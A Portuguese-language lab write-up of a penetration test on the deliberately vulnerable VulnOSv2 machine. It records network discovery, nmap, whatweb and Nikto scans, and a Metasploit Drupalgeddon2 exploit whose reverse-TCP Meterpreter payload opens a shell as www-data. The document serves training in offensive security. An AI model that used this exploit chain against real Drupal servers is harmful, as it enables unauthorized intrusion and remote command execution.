
Fase 1: Coleta de informação

Uso do netdiscover para identificação do IP a ser inspecionado no caso o 192.168.20.8

```jsx
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                              
                                                                                                                                                                            
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.20.1    52:54:00:12:35:00      1      60  Unknown vendor                                                                                                           
 192.168.20.2    52:54:00:12:35:00      1      60  Unknown vendor                                                                                                           
 192.168.20.3    08:00:27:8e:48:99      1      60  PCS Systemtechnik GmbH                                                                                                   
 192.168.20.8    08:00:27:57:4f:aa      1      60  PCS Systemtechnik GmbH 

```
Fase 2: Enumeração

Uso do nmap para o escaneamento de portas e serviços identificado a porta 22 (SSH) e porta 80 (HTTP)

```jsx
──(root㉿kali)-[/home/kali]
└─# nmap -vvv -A 192.168.20.8     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 20:08 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
Initiating ARP Ping Scan at 20:08
Scanning 192.168.20.8 [1 port]
Completed ARP Ping Scan at 20:08, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:08
Completed Parallel DNS resolution of 1 host. at 20:08, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:08
Scanning 192.168.20.8 [1000 ports]
Discovered open port 22/tcp on 192.168.20.8
Discovered open port 80/tcp on 192.168.20.8
Discovered open port 6667/tcp on 192.168.20.8
Completed SYN Stealth Scan at 20:08, 1.13s elapsed (1000 total ports)
Initiating Service scan at 20:08
Scanning 3 services on 192.168.20.8
Completed Service scan at 20:08, 11.08s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 192.168.20.8
NSE: Script scanning 192.168.20.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 7.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
Nmap scan report for 192.168.20.8
Host is up, received arp-response (0.0016s latency).
Scanned at 2024-03-20 20:08:19 EDT for 22s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAORRAsDcJJtkwMruX4yXojqiox8ni/JHNX/zgwtmPcfLkENKY5bYD1dMpASvE0K9Gh5Mo4U/yycRK9xHGLMssBBr5F8QOq8I66Ee7kOG+CJzT+g5Fhl+0R5pI2+kEGSipf+mL1A1HA9JYm87rNWkG3mI5cS4J2okX2CMZGPYucflAAAAFQCdR4coK0rgndw4wMd7SCCewTd5QQAAAIBGnb2CKZQhnmy7G/Dublt921HOMTOb3jXJugIp/Q0g9sQEkYQoEEXOS5+kDVODt7C1rgZQzvY4eX2gnEcW38esIIYVX5j54bV7RpcYTs+3onSvpLJJJudFOF8jS/J53DeiQ9sS68bCDi1K7h7f5dLeaemKJz8j42/8mdUpEZ+xHAAAAIBXyrkDziSMSuaCSxkfwFMzlqFWNI5EszgByhcHsuNYhrRryrZkC/Jq7ypWv2vt1zlkem9z/l5eX7gxwhckbQgPHqKxtmfznzoosQ0EoHAnG+bO7VXDM1yFl5xCXBLFvFlE6QjYJBcrtz9jeAJHUlyXAYIrSthz6y4OCc0rGAxC+g==
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpuBQNKY6U8FF+8yJgjCqn0f9MJ1rCgGLo2HdvhWvbgyOxmvf4mg47Oi4OWjpD7oiiaawPLFJfUPhBl7CVLLnMQxM6MDdmJP1qSl6slA52KB9Qt8hvPiatY9yF2UzTQ+riP9g2n6D9QQruSVQQFsKUeJvte2X7EApMmmXSQ1L/Qziio1mFu4tvqckMsfdjlYnFSRSdKoorT/7/Vw0sBUzDNsSsGq8tA3rqGOKmj3JdS0H0FGEciLFyIx9/rLC2bHc03l2V08Y8MozB3TQTcO6lvxpFgSAEPmNglCAMSZOIFmdIvpmi5FfHsVuP6O94twetVHq0CyvihY8SoXQoiqib
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMTthIC3/w1NQVyFFPrMh63/cVUWJylryc7v9Whbab9DKivYIWxffvI6HJpjeMm63ChJV9HjkbtGBbKhnNeRJ64=
|   256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMx/VEravl9aUxne0KuM0Eexc8iu9sMLlyKfDQJ7XIn4
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     syn-ack ttl 64 ngircd
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/20%OT=22%CT=1%CU=35109%PV=Y%DS=1%DC=D%G=Y%M=08002
OS:7%TM=65FB7A89%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=I%I
OS:I=I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW
OS:7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120
OS:%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=40%CD=S)

Uptime guess: 0.037 days (since Wed Mar 20 19:15:45 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.64 ms 192.168.20.8

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:08
Completed NSE at 20:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.98 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1016 (41.342KB)

```
Uso do Whatweb para identificação do webserver

```jsx
┌──(root㉿kali)-[/home/kali]
└─# whatweb http://192.168.20.8/jabc                                                                                                                             
http://192.168.20.8/jabc [301 Moved Permanently] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.20.8], RedirectLocation[http://192.168.20.8/jabc/], Title[301 Moved Permanently]
http://192.168.20.8/jabc/ [200 OK] Apache[2.4.7], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.20.8], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.5.9-1ubuntu4.14], Script[text/javascript], Title[JABC | Just Another Bioware Company], UncommonHeaders[x-generator], X-Powered-By[PHP/5.5.9-1ubuntu4.14]

```
Uso do Nikto como escanner de vulnerabilidade

```jsx
┌──(root㉿kali)-[/home/kali]
└─# nikto --url http://192.168.20.8/jabc
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.20.8
+ Target Hostname:    192.168.20.8
+ Target Port:        80
+ Start Time:         2024-03-20 20:09:47 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /jabc/: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14.
+ /jabc/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /jabc/: Drupal 7 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /jabc/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /jabc/scripts/: Directory indexing found.
+ /robots.txt: Entry '/?q=user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/install.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/scripts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /jabc/misc/: Directory indexing found.
+ /robots.txt: Entry '/misc/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /jabc/includes/: Directory indexing found.
+ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/register/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /jabc/profiles/: Directory indexing found.
+ /robots.txt: Entry '/profiles/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /jabc/themes/: Directory indexing found.
+ /robots.txt: Entry '/themes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/xmlrpc.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /jabc/modules/: Directory indexing found.
+ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 36 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /jabc/includes/: This might be interesting.
+ /jabc/misc/: This might be interesting.
+ /jabc/install.php: Drupal install.php file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-filehttps://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /jabc/install.php: install.php file found.
+ /jabc/xmlrpc.php: xmlrpc.php was found.
+ /jabc/sites/: Directory indexing found.
+ 8947 requests: 1 error(s) and 33 item(s) reported on remote host
+ End Time:           2024-03-20 20:10:28 (GMT-4) (41 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Fase 3: Exploração

Após a identificação do exploit público a ser usado foi utilizado o Metasploit como a execução

```jsx
┌──(root㉿kali)-[/home/kali]
└─# msfconsole 
Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.3.60-dev                          ]
+ -- --=[ 2403 exploits - 1239 auxiliary - 422 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval

msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_aws_instance_connect                   normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
   1   payload/generic/custom                                       normal  No     Custom Payload
   2   payload/generic/shell_bind_aws_ssm                           normal  No     Command Shell, Bind SSM (via AWS API)
   3   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   4   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   5   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   6   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   7   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   8   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   9   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   10  payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   11  payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   12  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   13  payload/php/exec                                             normal  No     PHP Execute Command
   14  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   15  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   16  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   17  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   18  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   19  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   20  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
   21  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   22  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload payload/php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options 

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.20.4     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.20.8
RHOSTS => 192.168.20.8
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /jabc
TARGETURI => /jabc

```

Execução do exploit e obtenção da shell (invasão)

```jsx
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.20.4:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (39927 bytes) to 192.168.20.8
[*] Meterpreter session 1 opened (192.168.20.4:4444 -> 192.168.20.8:53508) at 2024-03-20 20:14:00 -0400

meterpreter > shell
Process 2307 created.
Channel 0 created.
whoami
www-data
hostname
VulnOSv2
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:57:4f:aa  
          inet addr:192.168.20.8  Bcast:192.168.20.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe57:4faa/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:235157 errors:0 dropped:0 overruns:0 frame:0
          TX packets:224874 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:38276403 (38.2 MB)  TX bytes:113801473 (113.8 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1595 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1595 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:440642 (440.6 KB)  TX bytes:440642 (440.6 KB)

exit

```

